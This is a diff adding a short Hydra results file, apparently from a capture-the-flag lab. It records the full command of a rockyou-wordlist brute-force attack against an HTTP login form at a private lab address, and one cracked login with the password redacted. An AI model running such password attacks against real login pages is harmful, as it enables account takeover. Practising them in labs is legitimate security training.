@@ -1,0 +1,2 @@
+# Hydra v9.5 run at 2026-09-06 13:31:36 on 10.113.159.230 http-post-form (hydra -l help@support.thm -P /home/yousefmzayed/hdd/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -o support_creds.txt 10.113.159.230 http-post-form /index.php:email=^USER^&password=^PASS^:F=Invalid credentials)
+[80][http-post-form] host: 10.113.159.230   login: help@support.thm   password: [REDACTED]
